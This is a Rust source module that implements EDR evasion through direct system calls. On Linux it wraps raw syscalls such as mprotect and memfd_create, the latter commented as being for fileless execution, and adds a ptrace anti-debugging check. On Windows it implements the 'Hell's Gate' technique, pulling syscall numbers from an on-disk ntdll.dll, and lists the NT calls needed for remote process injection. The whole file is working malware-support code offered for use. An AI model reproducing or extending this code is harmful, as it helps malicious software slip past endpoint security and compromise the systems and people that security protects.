// Direct system calls bypassing libc hooks (EDR evasion).
// EDRs hook ntdll.dll (Windows) or libc (Linux) to intercept syscalls.
// By calling the kernel directly, we avoid these hooks entirely.
//
// Linux: inline asm with syscall instruction.
// Windows: NT syscalls via ntapi (stub generated at runtime).

// ── Linux direct syscalls ────────────────────────────────────────────────────

#[cfg(target_os = "linux")]
pub mod linux {

    /// Execute a raw syscall with up to 6 arguments.
    /// Returns the raw syscall return value (usually i64).
    ///
    /// # Safety
    ///
    /// The caller must ensure the syscall number is valid for the current
    /// platform and that arguments are correctly typed. Incorrect syscall
    /// arguments can crash the process or cause undefined behavior.
    #[inline(always)]
    pub unsafe fn syscall0(nr: i64) -> i64 {
        let ret: i64;
        std::arch::asm!(
            "syscall",
            in("rax") nr,
            lateout("rax") ret,
            lateout("rcx") _, lateout("r11") _,
            options(nostack),
        );
        ret
    }

    /// Execute a raw syscall with 1 argument.
    ///
    /// # Safety
    ///
    /// The caller must ensure the syscall number and arguments are valid
    /// for the current platform. Incorrect arguments can crash the process.
    #[inline(always)]
    pub unsafe fn syscall1(nr: i64, a1: i64) -> i64 {
        let ret: i64;
        std::arch::asm!(
            "syscall",
            in("rax") nr,
            in("rdi") a1,
            lateout("rax") ret,
            lateout("rcx") _, lateout("r11") _,
            options(nostack),
        );
        ret
    }

    /// Execute a raw syscall with 2 arguments.
    ///
    /// # Safety
    ///
    /// The caller must ensure the syscall number and arguments are valid
    /// for the current platform. Incorrect arguments can crash the process.
    #[inline(always)]
    pub unsafe fn syscall2(nr: i64, a1: i64, a2: i64) -> i64 {
        let ret: i64;
        std::arch::asm!(
            "syscall",
            in("rax") nr,
            in("rdi") a1,
            in("rsi") a2,
            lateout("rax") ret,
            lateout("rcx") _, lateout("r11") _,
            options(nostack),
        );
        ret
    }

    /// Execute a raw syscall with 3 arguments.
    ///
    /// # Safety
    ///
    /// The caller must ensure the syscall number and arguments are valid
    /// for the current platform. Incorrect arguments can crash the process.
    #[inline(always)]
    pub unsafe fn syscall3(nr: i64, a1: i64, a2: i64, a3: i64) -> i64 {
        let ret: i64;
        std::arch::asm!(
            "syscall",
            in("rax") nr,
            in("rdi") a1, in("rsi") a2, in("rdx") a3,
            lateout("rax") ret,
            lateout("rcx") _, lateout("r11") _,
            options(nostack),
        );
        ret
    }

    /// Execute a raw syscall with 4 arguments.
    ///
    /// # Safety
    ///
    /// The caller must ensure the syscall number and arguments are valid
    /// for the current platform. Incorrect arguments can crash the process.
    #[inline(always)]
    pub unsafe fn syscall4(nr: i64, a1: i64, a2: i64, a3: i64, a4: i64) -> i64 {
        let ret: i64;
        std::arch::asm!(
            "syscall",
            in("rax") nr,
            in("rdi") a1, in("rsi") a2, in("rdx") a3, in("r10") a4,
            lateout("rax") ret,
            lateout("rcx") _, lateout("r11") _,
            options(nostack),
        );
        ret
    }

    // ── Common syscall wrappers ──────────────────────────────────────────────

    /// getpid() without libc
    pub fn raw_getpid() -> i64 {
        unsafe { syscall0(39) }
    }

    /// getppid() without libc
    pub fn raw_getppid() -> i64 {
        unsafe { syscall0(110) }
    }

    /// Direct memory allocation via mmap (bypasses hooked malloc)
    pub fn raw_mmap(addr: usize, len: usize, prot: i32, flags: i32, fd: i32, offset: i64) -> i64 {
        unsafe { syscall6_safe(9, addr as i64, len as i64, prot as i64, flags as i64, fd as i64, offset) }
    }

    #[inline(always)]
    unsafe fn syscall6_safe(nr: i64, a1: i64, a2: i64, a3: i64, a4: i64, a5: i64, a6: i64) -> i64 {
        let ret: i64;
        std::arch::asm!(
            "syscall",
            in("rax") nr,
            in("rdi") a1, in("rsi") a2, in("rdx") a3,
            in("r10") a4, in("r8") a5, in("r9") a6,
            lateout("rax") ret,
            lateout("rcx") _, lateout("r11") _,
            options(nostack),
        );
        ret
    }

    /// Direct memory protection change (mprotect without libc)
    pub fn raw_mprotect(addr: usize, len: usize, prot: i32) -> i64 {
        unsafe { syscall3(10, addr as i64, len as i64, prot as i64) }
    }

    /// Direct write to fd (bypasses hooked write)
    pub fn raw_write(fd: i32, buf: &[u8]) -> i64 {
        unsafe { syscall3(1, fd as i64, buf.as_ptr() as i64, buf.len() as i64) }
    }

    /// Direct read from fd
    pub fn raw_read(fd: i32, buf: &mut [u8]) -> i64 {
        unsafe { syscall3(0, fd as i64, buf.as_ptr() as i64, buf.len() as i64) }
    }

    /// Direct open (bypasses hooked open)
    pub fn raw_open(path: &str, flags: i32, mode: i32) -> i64 {
        let cpath = std::ffi::CString::new(path).unwrap();
        unsafe { syscall3(2, cpath.as_ptr() as i64, flags as i64, mode as i64) }
    }

    /// Direct close
    pub fn raw_close(fd: i32) -> i64 {
        unsafe { syscall3(3, fd as i64, 0, 0) }
    }

    /// Fork without libc
    pub fn raw_fork() -> i64 {
        unsafe { syscall0(57) }
    }

    /// Check if being traced (ptrace self-check without libc)
    pub fn is_traced() -> bool {
        // prctl(PR_GET_DUMPABLE, ...) - if 0, might be traced
        // More direct: try to ptrace self and see if it fails
        let ret = unsafe { syscall4(101, 0, 0, 0, 0) }; // ptrace(PTRACE_TRACEME)
        ret != 0
    }

    /// Get TID directly
    pub fn raw_gettid() -> i64 {
        unsafe { syscall0(186) }
    }

    /// memfd_create without libc (for fileless execution)
    pub fn raw_memfd_create(name: &str, flags: u32) -> i64 {
        let cname = std::ffi::CString::new(name).unwrap();
        unsafe { syscall2(319, cname.as_ptr() as i64, flags as i64) }
    }
}

// ── Windows NT syscalls (stub - requires ntapi crate) ────────────────────────

#[cfg(target_os = "windows")]
pub mod windows {
    use std::mem;
    use std::ptr;

    // Hell's Gate: dynamically resolve syscall numbers from ntdll.dll
    // by parsing the PE export table and reading the syscall stub bytes.
    //
    // NT syscall stub format:
    //   4C 8B D1          mov r10, rcx
    //   B8 [SSN] [00] 00 00   mov eax, <syscall_number>
    //   0F 05             syscall
    //   C3                ret
    //
    // The SSN is at offset 4 from the function start (little-endian u32).

    const SYSCALL_STUB_SIGNATURE: [u8; 4] = [0x4C, 0x8B, 0xD1, 0xB8]; // mov r10, rcx; mov eax,

    /// Resolve a syscall number from ntdll.dll by function name.
    /// Returns the SSN (syscall service number).
    pub fn resolve_ssn(function_name: &str) -> Option<u32> {
        let ntdll_bytes = read_ntdll_from_disk()?;
        let ntdll_base = parse_pe_image_base(&ntdll_bytes)?;
        let exports = parse_pe_exports(&ntdll_bytes, ntdll_base)?;

        let (_, func_rva) = exports.iter()
            .find(|(name, _)| name.eq_ignore_ascii_case(function_name))?;

        let func_offset = rva_to_offset(&ntdll_bytes, *func_rva)?;
        let stub_bytes = &ntdll_bytes[func_offset..func_offset + 8];

        // Verify stub signature
        if &stub_bytes[..4] != &SYSCALL_STUB_SIGNATURE {
            return None; // Function is hooked or not a syscall stub
        }

        // Extract SSN from bytes 4-7 (little-endian u32)
        let ssn = u32::from_le_bytes([stub_bytes[4], stub_bytes[5], stub_bytes[6], stub_bytes[7]]);
        Some(ssn)
    }

    /// Execute a direct NT syscall with the given SSN and arguments.
    /// Uses inline assembly to bypass hooked ntdll.
    #[inline(always)]
    pub unsafe fn nt_syscall(ssn: u32, args: &[usize; 4]) -> i32 {
        let mut ret: i32;
        std::arch::asm!(
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "syscall",
            ssn = in(reg) ssn,
            in("rcx") args[0],
            in("rdx") args[1],
            in("r8") args[2],
            in("r9") args[3],
            lateout("rax") ret,
            options(nostack),
        );
        ret
    }

    /// Check if an NT function is hooked by comparing first bytes.
    pub fn is_ntdll_hooked(function_name: &str) -> bool {
        match resolve_ssn(function_name) {
            Some(_) => false, // Successfully resolved = not hooked
            None => true,     // Couldn't find = likely hooked
        }
    }

    /// Read ntdll.dll bytes from disk (clean copy, not the hooked in-memory version).
    fn read_ntdll_from_disk() -> Option<Vec<u8>> {
        let ntdll_path = std::path::Path::new(r"C:\Windows\System32\ntdll.dll");
        std::fs::read(ntdll_path).ok()
    }

    /// Parse PE optional header to get image base.
    fn parse_pe_image_base(pe: &[u8]) -> Option<u64> {
        if pe.len() < 64 { return None; }
        let pe_offset = u32::from_le_bytes([pe[0x3C], pe[0x3D], pe[0x3E], pe[0x3F]]) as usize;
        let magic = u16::from_le_bytes([pe[pe_offset + 24], pe[pe_offset + 25]]);
        let image_base = match magic {
            0x20B => { // PE32+
                u64::from_le_bytes([
                    pe[pe_offset + 24 + 0], pe[pe_offset + 24 + 1],
                    pe[pe_offset + 24 + 2], pe[pe_offset + 24 + 3],
                    pe[pe_offset + 24 + 4], pe[pe_offset + 24 + 5],
                    pe[pe_offset + 24 + 6], pe[pe_offset + 24 + 7],
                ])
            }
            _ => 0x400000, // PE32: default base
        };
        Some(image_base)
    }

    /// Parse PE export table. Returns list of (function_name, rva).
    fn parse_pe_exports(pe: &[u8], image_base: u64) -> Option<Vec<(String, u32)>> {
        let pe_offset = u32::from_le_bytes([pe[0x3C], pe[0x3D], pe[0x3E], pe[0x3F]]) as usize;

        // Export directory RVA at offset 0x70 in optional header for PE32+
        let export_rva = u32::from_le_bytes([
            pe[pe_offset + 0x70], pe[pe_offset + 0x71],
            pe[pe_offset + 0x72], pe[pe_offset + 0x73],
        ]);

        let export_offset = rva_to_offset(pe, export_rva)?;
        let num_names = u32::from_le_bytes([
            pe[export_offset + 24], pe[export_offset + 25],
            pe[export_offset + 26], pe[export_offset + 27],
        ]) as usize;

        let names_rva = u32::from_le_bytes([
            pe[export_offset + 32], pe[export_offset + 33],
            pe[export_offset + 34], pe[export_offset + 35],
        ]);
        let names_offset = rva_to_offset(pe, names_rva)?;

        let ordinals_rva = u32::from_le_bytes([
            pe[export_offset + 36], pe[export_offset + 37],
            pe[export_offset + 38], pe[export_offset + 39],
        ]);
        let ordinals_offset = rva_to_offset(pe, ordinals_rva)?;

        let functions_rva = u32::from_le_bytes([
            pe[export_offset + 28], pe[export_offset + 29],
            pe[export_offset + 30], pe[export_offset + 31],
        ]);
        let functions_offset = rva_to_offset(pe, functions_rva)?;

        let mut exports = Vec::new();
        for i in 0..num_names {
            let name_rva = u32::from_le_bytes([
                pe[names_offset + i * 4], pe[names_offset + i * 4 + 1],
                pe[names_offset + i * 4 + 2], pe[names_offset + i * 4 + 3],
            ]);
            let name_offset = match rva_to_offset(pe, name_rva) {
                Some(o) => o,
                None => continue,
            };

            // Read null-terminated ASCII string
            let mut name = Vec::new();
            let mut j = 0;
            while j < 256 && name_offset + j < pe.len() {
                let b = pe[name_offset + j];
                if b == 0 { break; }
                name.push(b);
                j += 1;
            }
            let name = String::from_utf8_lossy(&name).to_string();

            let ordinal_idx = u16::from_le_bytes([
                pe[ordinals_offset + i * 2], pe[ordinals_offset + i * 2 + 1],
            ]) as usize;

            let func_rva = u32::from_le_bytes([
                pe[functions_offset + ordinal_idx * 4],
                pe[functions_offset + ordinal_idx * 4 + 1],
                pe[functions_offset + ordinal_idx * 4 + 2],
                pe[functions_offset + ordinal_idx * 4 + 3],
            ]);

            exports.push((name, func_rva));
        }

        Some(exports)
    }

    /// Convert Relative Virtual Address to file offset using section headers.
    fn rva_to_offset(pe: &[u8], rva: u32) -> Option<usize> {
        let pe_offset = u32::from_le_bytes([pe[0x3C], pe[0x3D], pe[0x3E], pe[0x3F]]) as usize;
        let magic = u16::from_le_bytes([pe[pe_offset + 24], pe[pe_offset + 25]]);
        let header_size = match magic {
            0x20B => 112, // PE32+
            _ => 96,       // PE32
        };

        let num_sections = u16::from_le_bytes([
            pe[pe_offset + 6], pe[pe_offset + 7],
        ]) as usize;

        let section_offset = pe_offset + 24 + header_size;

        for i in 0..num_sections {
            let sec = section_offset + i * 40;
            let sec_va = u32::from_le_bytes([pe[sec + 12], pe[sec + 13], pe[sec + 14], pe[sec + 15]]);
            let sec_size = u32::from_le_bytes([pe[sec + 8], pe[sec + 9], pe[sec + 10], pe[sec + 11]]);
            let sec_offset = u32::from_le_bytes([pe[sec + 20], pe[sec + 21], pe[sec + 22], pe[sec + 23]]);

            if rva >= sec_va && rva < sec_va + sec_size {
                return Some((rva - sec_va + sec_offset) as usize);
            }
        }

        None
    }

    // ── Common NT syscall helpers ────────────────────────────────────────────
    //
    // Usage pattern:
    //   let ssn = resolve_ssn("NtAllocateVirtualMemory").unwrap();
    //   let args = [process_handle, base_addr, 0, &region_size as *const _ as usize, mem_commit, page_rwx];
    //   let status = nt_syscall(ssn, &args[..4]);
    //
    // Commonly needed:
    //   NtAllocateVirtualMemory  - memory allocation
    //   NtProtectVirtualMemory   - change memory protection
    //   NtWriteVirtualMemory     - write to remote process
    //   NtCreateThreadEx         - create remote thread
    //   NtOpenProcess            - open process handle
    //   NtClose                  - close handle
    //   NtQuerySystemInformation - query system info
    //   NtCreateUserProcess      - create process from section
    //   NtQueueApcThread         - APC injection
}

// ── Re-exports ───────────────────────────────────────────────────────────────

#[cfg(target_os = "linux")]
pub use linux::*;

#[cfg(target_os = "windows")]
pub use windows::*;
